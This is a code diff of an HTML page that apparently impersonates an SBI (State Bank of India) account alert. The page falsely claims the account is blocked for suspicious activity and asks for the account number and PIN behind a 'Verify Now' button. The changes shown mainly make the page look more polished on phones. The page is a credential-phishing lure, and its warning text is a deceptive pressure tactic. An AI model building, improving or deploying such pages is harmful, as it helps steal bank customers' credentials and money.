@@ -3,49 +3,65 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bank Account Alert</title>
+
     <style>
         body {
-            font-family: Arial;
+            font-family: Arial, sans-serif;
             background: white;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
-            align-items: center;
-            height: 100vh;
+            align-items: flex-start;
+            min-height: 100vh;
         }
+
         .container {
             background: white;
-            width: 350px;
-            padding: 25px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.2);
-            border-radius: 10px;
-            text-align: center;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            margin-top: 20px;
+            box-sizing: border-box;
         }
+
+        img {
+            width: 150px;
+            display: block;
+            margin: 0 auto 10px auto;
+        }
+
         input {
             width: 100%;
-            padding: 10px;
-            margin: 8px 0;
+            padding: 12px;
+            margin: 10px 0;
             border-radius: 5px;
             border: 1px solid #ccc;
+            font-size: 16px;
+            box-sizing: border-box;
         }
+
         .pass {
             color: rgb(67, 67, 189);
             font-size: 14px;
-            text-align: end;
+            text-align: right;
             margin-top: -5px;
-            cursor: pointer;
         }
+
         button {
             background: #0054a6;
             color: white;
             width: 100%;
             padding: 12px;
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
             font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
             margin-top: 10px;
+        }
+
+        button:hover {
+            background: #003f7d;
         }
     </style>
 </head>
@@ -53,19 +69,20 @@
 <body>
 
 <div class="container">
-    <img src="SBI logo.png" width="160">
+    <img src="SBI logo.png">
 
-    <h1>⚠ Account Alert</h1>
-    <p style="color:red; font-weight:bold;">
+    <h2 style="text-align:center;">⚠ Account Alert</h2>
+
+    <p style="color:red; font-weight:bold; text-align:center;">
         Your bank account has been temporarily blocked due to suspicious activity.
     </p>
 
-    <p>Please verify your details to restore access.</p>
+    <p style="text-align:center;">Please verify your details to restore access.</p>
 
     <input id="account" type="text" placeholder="Account Number">
     <input id="pin" type="password" placeholder="Enter PIN">
 
-    <h3 class="pass">Forgot PIN ?</h3>
+    <div class="pass">Forgot PIN?</div>
 
     <button onclick="verifyUser()">Verify Now</button>
 </div>
